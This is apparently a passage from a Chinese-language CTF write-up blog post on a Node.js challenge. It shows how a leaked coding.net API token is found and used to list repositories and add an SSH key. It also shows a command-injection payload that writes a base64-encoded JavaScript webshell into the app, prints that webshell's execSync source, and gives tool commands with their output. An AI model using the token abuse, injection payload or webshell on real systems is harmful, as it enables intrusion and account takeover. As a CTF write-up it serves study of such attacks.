<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script src=&quot;https://fastly.jsdelivr.net/npm/axios@0.21.1/dist/axios.min.js&quot;&gt;&lt;/script&gt;</span><br><span class="line">                     axios.get(&#x27;/v2/coding/projectList&#x27;)</span><br><span class="line">                     axios.get(&#x27;/v2/coding/versionList&#x27;, &#123;</span><br><span class="line">                     axios.get(&#x27;/v2/coding/distList&#x27;, &#123;</span><br><span class="line">                     return (await axios.get(&#x27;/v2/coding/distExist&#x27;, &#123;</span><br></pre></td></tr></table></figure>
<p>一共 4 个 api<br>无论是哪个 api 你都可以进行跟踪<br>例如第二个 api &#x2F;v2&#x2F;coding&#x2F;versionList 所在的位置根据上面 middleware&#x2F;api 的推断<br>可以发现放在了如下的位置<br>喜欢写注释真是好程序员 (确信)<br> &#x2F;api&#x2F;v2&#x2F;coding&#x2F;versionList.js<br>访问后我们可以得到如下的 js 文件</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">const path = require(&#x27;path&#x27;)</span><br><span class="line"> const coding = require(&#x27;../../../request/coding&#x27;)</span><br><span class="line"> </span><br><span class="line"> const distExtname = [</span><br><span class="line">     &#x27;.tgz&#x27;,</span><br><span class="line">     &#x27;.exe&#x27;,</span><br><span class="line">     &#x27;.dmg&#x27;,</span><br><span class="line">     &#x27;.AppImage&#x27;,</span><br><span class="line"> ]</span><br><span class="line"> </span><br><span class="line"> module.exports = &#123;</span><br><span class="line">     async get(request, response) &#123;</span><br><span class="line">         const ProjectId = Number(request.params.ProjectId)</span><br><span class="line"> </span><br><span class="line">         let data = []</span><br><span class="line">                 // post to 一个后端 </span><br><span class="line">         const storeList = (await coding.post(&#x27;/open-api&#x27;, &#123;</span><br><span class="line">             Action: &#x27;DescribeProjectDepotInfoList&#x27;,</span><br><span class="line">             ProjectId,</span><br><span class="line">         &#125;)).data.Response.DepotData.Depots</span><br><span class="line"> </span><br><span class="line">         for (const store of storeList) &#123;</span><br><span class="line">             const versionList = (await coding.post(&#x27;/open-api&#x27;, &#123;</span><br><span class="line">                 Action: &#x27;DescribeGitReleases&#x27;,</span><br><span class="line">                 DepotId: Number(store.Id),</span><br><span class="line">                 Status: 1,</span><br><span class="line">                 PageNumber: 1,</span><br><span class="line">                 PageSize: 100,</span><br><span class="line">             &#125;)).data.Response.ReleasePageList.Releases</span><br><span class="line"> </span><br><span class="line">             data = [...data, ...versionList]</span><br><span class="line">         &#125;</span><br><span class="line"> </span><br><span class="line">         data.sort((a, b) =&gt; a.TagName &lt; b.TagName ? 1 : -1)</span><br><span class="line"> </span><br><span class="line">         response.setData(data)</span><br><span class="line">         response.success()</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>我们可以发现他是另一个后端 api 的代理 而那个后端定义在 request&#x2F;coding 中</p>
<h3 id="获得-token"><a href="#获得-token" class="headerlink" title="获得 token"></a>获得 token</h3><p>我们可以通过相对的路径得到 url<br>访问 <a target="_blank" rel="noopener" href="http://127.0.0.1/request/coding.js">http://127.0.0.1/request/coding.js</a> 中获取</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">const axios = require(&#x27;axios&#x27;)</span><br><span class="line"> </span><br><span class="line"> // Access Token</span><br><span class="line"> const codingToken = &#x27;token e(This_Is_real_Token)c&#x27;</span><br><span class="line"> </span><br><span class="line"> const coding = axios.create(&#123;</span><br><span class="line">     baseURL: &#x27;https://e.coding.net&#x27;,</span><br><span class="line">     headers: &#123;</span><br><span class="line">         Authorization: codingToken,</span><br><span class="line">     &#125;,</span><br><span class="line"> &#125;)</span><br><span class="line"> </span><br><span class="line"> module.exports = coding</span><br></pre></td></tr></table></figure>
<p>网上搜索 e.coding.net 发现是一个 devops 平台 具有相当的利用价值<br>同时这里也暴露了 对应的 Token</p>
<h3 id="接管用户账户"><a href="#接管用户账户" class="headerlink" title="接管用户账户"></a>接管用户账户</h3><p>进一步使用搜索引擎可以发现对应的 openapi 文档 <a target="_blank" rel="noopener" href="https://coding.net/help/openapi">https://coding.net/help/openapi</a><br>如果发现了项目 <a target="_blank" rel="noopener" href="https://github.com/Esonhugh/tencent-coding-openapi/">https://github.com/Esonhugh/tencent-coding-openapi/</a><br>这里提供了非常方便的利用工具 可以一键列出项目和仓库 并且可以增加 ssh keys 只需要导入一个 api token 即可。<br>发现是个人 api （token 开头）<br>列出项目</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H &quot;Authorization: token e(This_Is_real_Token)c&quot; -d &#x27;&#123;</span><br><span class="line">   &quot;Action&quot;: &quot;DescribeCodingProjects&quot;,</span><br><span class="line">   &quot;PageNumber&quot;: 1,</span><br><span class="line">   &quot;PageSize&quot;: 10</span><br><span class="line"> &#125;&#x27;</span><br><span class="line"> # python usage</span><br><span class="line"> python ./digging-shell.py list_projects</span><br><span class="line"> ic| r.status_code: 200</span><br><span class="line"> ic| r.headers: Headers(&#123;&#x27;server&#x27;: &#x27;Nginx&#x27;, &#x27;date&#x27;: &#x27;Mon, 17 Apr 2023 11:04:54 GMT&#x27;, &#x27;content-type&#x27;: &#x27;application/json&#x27;, &#x27;transfer-encoding&#x27;: &#x27;chunked&#x27;, &#x27;connection&#x27;: &#x27;keep-alive&#x27;, &#x27;content-encoding&#x27;: &#x27;gzip&#x27;, &#x27;x-target-env&#x27;: &#x27;prod_with_canary&#x27;&#125;)</span><br></pre></td></tr></table></figure>
<p>Response</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;Response&quot;: &#123;</span><br><span class="line">     &quot;RequestId&quot;: &quot;10bcd5a9-7d9a-4a80-a1ec-e833d4c89d77&quot;,</span><br><span class="line">     &quot;Data&quot;: &#123;</span><br><span class="line">       &quot;PageNumber&quot;: 1,</span><br><span class="line">       &quot;PageSize&quot;: 10,</span><br><span class="line">       &quot;TotalCount&quot;: 1,</span><br><span class="line">       &quot;ProjectList&quot;: [</span><br><span class="line">         &#123;</span><br><span class="line">           &quot;Id&quot;: 11680350,</span><br><span class="line">           &quot;CreatedAt&quot;: 1678157689000,</span><br><span class="line">           &quot;UpdatedAt&quot;: 1678157689000,</span><br><span class="line">           &quot;Status&quot;: 1,</span><br><span class="line">           &quot;Type&quot;: 2,</span><br><span class="line">           &quot;MaxMember&quot;: 0,</span><br><span class="line">           &quot;Name&quot;: &quot;leak-token-leak-git&quot;,</span><br><span class="line">           &quot;DisplayName&quot;: &quot;leak my git&quot;,</span><br><span class="line">           &quot;Description&quot;: &quot;Wow! you got there! SuperCool man!&quot;,</span><br><span class="line">           &quot;Icon&quot;: &quot;https://e.coding.net/static/project_icon/scenery-version-2-10.svg&quot;,</span><br><span class="line">           &quot;TeamOwnerId&quot;: 3921812,</span><br><span class="line">           &quot;UserOwnerId&quot;: 0,</span><br><span class="line">           &quot;StartDate&quot;: 0,</span><br><span class="line">           &quot;EndDate&quot;: 0,</span><br><span class="line">           &quot;TeamId&quot;: 3921812,</span><br><span class="line">           &quot;IsDemo&quot;: false,</span><br><span class="line">           &quot;Archived&quot;: false,</span><br><span class="line">           &quot;ProgramIds&quot;: []</span><br><span class="line">         &#125;</span><br><span class="line">       ]</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>列出仓库</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H &quot;Authorization: token e(This_Is_real_Token)c&quot; -d &#x27;&#123;</span><br><span class="line">   &quot;Action&quot;: &quot;DescribeProjectDepotInfoList&quot;,</span><br><span class="line">   &quot;ProjectId&quot;: 11414022</span><br><span class="line"> &#125;&#x27;</span><br><span class="line"> # python usage</span><br><span class="line"> python ./digging-shell.py list_repos   </span><br><span class="line"> ic| r.status_code: 200</span><br><span class="line"> ic| r.headers: Headers(&#123;&#x27;server&#x27;: &#x27;Nginx&#x27;, &#x27;date&#x27;: &#x27;Mon, 17 Apr 2023 11:04:00 GMT&#x27;, &#x27;content-type&#x27;: &#x27;application/json&#x27;, &#x27;transfer-encoding&#x27;: &#x27;chunked&#x27;, &#x27;connection&#x27;: &#x27;keep-alive&#x27;, &#x27;content-encoding&#x27;: &#x27;gzip&#x27;, &#x27;x-target-env&#x27;: &#x27;prod_with_canary&#x27;&#125;)</span><br></pre></td></tr></table></figure>
<p>Response</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">   &quot;Response&quot;: &#123;</span><br><span class="line">     &quot;RequestId&quot;: &quot;1b4dee8f-afce-4495-8e8b-d776c8097397&quot;,</span><br><span class="line">     &quot;DepotData&quot;: &#123;</span><br><span class="line">       &quot;Depots&quot;: [</span><br><span class="line">         &#123;</span><br><span class="line">           &quot;Id&quot;: 10467875,</span><br><span class="line">           &quot;Name&quot;: &quot;leak-source-code&quot;,</span><br><span class="line">           &quot;HttpsUrl&quot;: &quot;https://e.coding.net/vuln-git/leak-token-leak-git/leak-source-code.git&quot;,</span><br><span class="line">           &quot;ProjectId&quot;: 11680350,</span><br><span class="line">           &quot;SshUrl&quot;: &quot;git@e.coding.net:vuln-git/leak-token-leak-git/leak-source-code.git&quot;,</span><br><span class="line">           &quot;WebUrl&quot;: &quot;https://vuln-git.coding.net/p/leak-token-leak-git/d/leak-source-code&quot;,</span><br><span class="line">           &quot;VcsType&quot;: &quot;git&quot;,</span><br><span class="line">           &quot;ProjectName&quot;: &quot;leak-token-leak-git&quot;,</span><br><span class="line">           &quot;Description&quot;: &quot;Got there!&quot;,</span><br><span class="line">           &quot;CreatedAt&quot;: 1678157728000,</span><br><span class="line">           &quot;LastPushAt&quot;: 0</span><br><span class="line">         &#125;</span><br><span class="line">       ],</span><br><span class="line">       &quot;Page&quot;: &#123;</span><br><span class="line">         &quot;PageNumber&quot;: 1,</span><br><span class="line">         &quot;PageSize&quot;: 1,</span><br><span class="line">         &quot;TotalPage&quot;: 1,</span><br><span class="line">         &quot;TotalRow&quot;: 1</span><br><span class="line">       &#125;</span><br><span class="line">     &#125;</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>发现要登陆 尝试获取 sshkey<br>创建 sshkey</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">curl https://e.coding.net/open-api -H &quot;Authorization: token e(This_Is_real_Token)c&quot; -d &#x27;&#123;</span><br><span class="line">   &quot;Action&quot;: &quot;CreateSshKey&quot;,</span><br><span class="line">   &quot;Title&quot;: &quot;Hacker&quot;,</span><br><span class="line">   &quot;Content&quot;: &quot;ssh-rsa AAAA== rsatest&quot;,</span><br><span class="line">   &quot;ExpirationDate&quot;: &quot;9999-12-31&quot;</span><br><span class="line"> &#125;&#x27;</span><br><span class="line"> # python usage</span><br><span class="line"> python ./digging-shell.py add_ssh_key sshkey.rsa</span><br></pre></td></tr></table></figure>
<p>成功后 git clone <a href="mailto:&#x67;&#x69;&#116;&#64;&#101;&#46;&#99;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#46;&#110;&#101;&#116;">&#x67;&#x69;&#116;&#64;&#101;&#46;&#99;&#x6f;&#x64;&#x69;&#x6e;&#x67;&#46;&#110;&#101;&#116;</a>:XXXXX&#x2F;XXXX&#x2F;XXXX.git</p>
<h3 id="项目源代码"><a href="#项目源代码" class="headerlink" title="项目源代码"></a>项目源代码</h3><p>进行审计。 把起来项目跑起来。<br>可以在 api 文件夹中找到一个 &#x2F;v3&#x2F;UpdateAllProduct.js 文件 这个文件也是可以使用的 api 在 html 主页中可以找到对应的文件泄漏。<br>存在命令注入的可能 注入非常的简单 projectName 之类的参数都可以注入 因为这些是直接拼接进去的。<br>正式的题目环境应该是禁止反向 shell 连接出来的<br>第一种办法是纯粹的无回显的布尔命令注入<br>但是这里滥用一下代码中的存在的 js CGI 魔法 我们可以尝试写入一个 webshell js 来进行 Getshell </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># use as curl</span><br><span class="line"> curl &quot;https://127.0.0.1/v3/UpdateAllProduct&quot; \</span><br><span class="line">          -H &#x27;x-coding-event: ping1&#x27; \</span><br><span class="line">          -X POST -k \</span><br><span class="line">          --data-raw &quot;artifact.artifactRepoName=12&amp;artifact.artifactPkgName=\&quot;;echo $&#123;BASE64WEBSHELL&#125;|base64 -d &gt; /app/api/v2/badWebShell.js #\&quot;&amp;artifact.artifactVersionName=1.4&amp;artifact.projectName=testing&quot;</span><br><span class="line"> # python usage</span><br><span class="line"> python digging-shell.py upload_shell ./upload_shell.js https://nodejs-hack.cloud.eson.ninja </span><br><span class="line"> # https://nodejs-hack.cloud.eson.ninja replace your url 不要加 / 我的服务是禁止nodejs 外连其他服务 所以会导致内部的js的命令拼接执行时候的 curl 失效，导致一次 500 ，否则会返回服务正常更新的 json</span><br><span class="line"> # output like following</span><br><span class="line"> ic| file_data: &#x27;Y29uc3&lt;base64ed file data&gt;AAA=&#x27;</span><br><span class="line"> Traceback (most recent call last):</span><br><span class="line"> .....</span><br><span class="line"> httpx.ReadTimeout: The read operation timed out</span><br></pre></td></tr></table></figure>
<p>其中 BASE64WEBSHELL 的值为 js webshell 的样本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">const fs = require(&#x27;fs&#x27;)</span><br><span class="line"> const path = require(&#x27;path&#x27;)</span><br><span class="line"> const &#123; execSync &#125; = require(&#x27;child_process&#x27;)</span><br><span class="line"> </span><br><span class="line"> module.exports = &#123;</span><br><span class="line">     // API POST</span><br><span class="line">     async post(request, response) &#123;</span><br><span class="line">         // console.log(request.params)</span><br><span class="line">         artifactPkgName = request.params.artifactPkgName</span><br><span class="line">         // Save Path</span><br><span class="line">         const localDir = __dirname</span><br><span class="line">         // curl command</span><br><span class="line">         const curlCMD = artifactPkgName</span><br><span class="line">         // Create Path</span><br><span class="line">         fs.mkdirSync(localDir, &#123; recursive: true &#125;)</span><br><span class="line">         // download artificate</span><br><span class="line">         ResponseData = execSync(curlCMD, &#123; cwd: localDir &#125;).toString()</span><br><span class="line">         // Response</span><br><span class="line">         response.success(ResponseData)</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>
<p>由于 pm2 会自动托管和加载 api 文件夹下的 js 文件 所以我们可以直接访问 webshell<br>webshell 链接地址为 <a target="_blank" rel="noopener" href="https://127.0.0.1/v2/badWebShell">https://127.0.0.1/v2/badWebShell</a> 请求方式为 POST<br>POST Form 的内容为 ‘artifactPkgName&#x3D;{CMD}’<br>参考 check-shell 函数</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">python ./digging-shell.py get_shell https://nodejs-hack.cloud.eson.ninja ls # replace ls as your command. and replace https://nodejs-hack.cloud.eson.ninja as your url and also no / behind.</span><br><span class="line"> ic| command: &#x27;ls&#x27;</span><br><span class="line"> ic| resp.status_code: 200</span><br><span class="line"> badWebShell.js</span><br><span class="line"> coding</span><br></pre></td></tr></table></figure>

<p> 其实给我一股子hackthebox的味道。。。不过JSwebshell还是可以学一下的，类似内存马吧。</p>
<h1 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h1><p>0解题，不放wp</p>

    </div>

    
    <div class="about">
        <h1>About this Post</h1>
        <div class="details">
            <p>This post is written by Boogipop, licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc/4.0">CC BY-NC 4.0</a>.</p>
        </div>
        
        <p class="tags">
            
            <i class="icon"></i>
            <a href="/tags/WriteUp/" class="tag">#WriteUp</a>
        </p>
        
    </div>
    

    <div class="container post-prev-next">
        
        <a href="/2023/04/25/AliyunCTF%202023%20WriteUP/" class="next">
            <div>
                <div class="text">
                    <p class="label">Next</p>
                    <h3 class="title">AliyunCTF 2023 Writeup</h3>
                </div>
            </div>
        </a>
        
        
        <a href="/2023/04/24/Apache%20SCXML2%20RCE%E5%88%86%E6%9E%90/" class="prev">
            <div>
                <div class="text">
                    <p class="label">Previous</p>
                    <h3 class="title">Apache SCXML2 RCE分析</>
                </div>
            </div>
        </a>
        
    </div>

    
        
        
        <script src="https://giscus.app/client.js" data-repo="Boogipop/Boogipop.github.io" data-repo-id="R_kgDOIFi78g" data-category="Announcements" data-category-id="DIC_kwDOIFi78s4Cav9f" data-mapping="pathname" data-strict="1" data-reactions-enabled="1" data-emit-metadata="0" data-input-position="top" data-theme="preferred_color_scheme" data-lang="zh-CN" crossorigin="anonymous" async></script>
        
    
</article>

        <footer>
    <div class="inner">
        <div class="links">
            
            <div class="group">
                <h2 class="title">Blog</h2>
                
                <a href="/" class="item">Blog</a>
                
                <a href="/archives" class="item">Archives</a>
                
                <a href="/tags" class="item">Tags</a>
                
                <a href="/categories" class="item">Categories</a>
                
                <a href="/search" class="item">Search</a>
                
                <a href="/friends" class="item">Friends</a>
                
                <a href="/about" class="item">About</a>
                
                <a href="/atom.xml" class="item">RSS</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Projects</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/rsa-cli" class="item">RSA CLI</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/hexo-theme-cupertino" class="item">Hexo Theme Cupertino</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/a-calendar" class="item">A Calendar</a>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom/auto-mirroring-bucket" class="item">Auto Mirroring Bucket</a>
                
            </div>
            
            <div class="group">
                <h2 class="title">Me</h2>
                
                <a target="_blank" rel="noopener" href="https://github.com/MrWillCom" class="item">GitHub</a>
                
                <a target="_blank" rel="noopener" href="https://codepen.io/mrwillcom" class="item">CodePen</a>
                
                <a target="_blank" rel="noopener" href="https://www.patreon.com/MrWillCom" class="item">Patreon</a>
                
                <a target="_blank" rel="noopener" href="https://noc.social/@MrWillCom" class="item">Mastodon</a>
                
                <a target="_blank" rel="noopener" href="https://discord.gg/UKuFDjcfY8" class="item">Discord</a>
                
                <a href="mailto:mr.will.com@outlook.com" class="item">Email</a>
                
            </div>
            
        </div>
        <span>&copy; 2024 Boogipop<br>Powered by <a href="http://hexo.io/" target="_blank">Hexo</a> </span>
        
        
            <br>
            <div class="color-scheme-toggle" role="radiogroup" id="theme-color-scheme-toggle">
                <label>
                    <input type="radio" value="light">
                    <span>Light</span>
                </label>
                <label>
                    <input type="radio" value="dark">
                    <span>Dark</span>
                </label>
                <label>
                    <input type="radio" value="auto">
                    <span>Auto</span>
                </label>
            </div>
        
    </div>
</footer>


        
<script src="/js/main.js"></script>

        
        
        

        
        <script src="https://unpkg.com/scrollreveal"></script>
		
        <script>
            window.addEventListener('load', () => {
                ScrollReveal({ delay: 250, reset: true, easing: 'cubic-bezier(0, 0, 0, 1)' })
                ScrollReveal().reveal('.post-list-item .cover-img img')
                ScrollReveal().reveal('.post-list-item, .card, .content p img, .content .block-large img', { distance: '60px', origin: 'bottom', duration: 800 })
            })
        </script>
        
    </body>
</html>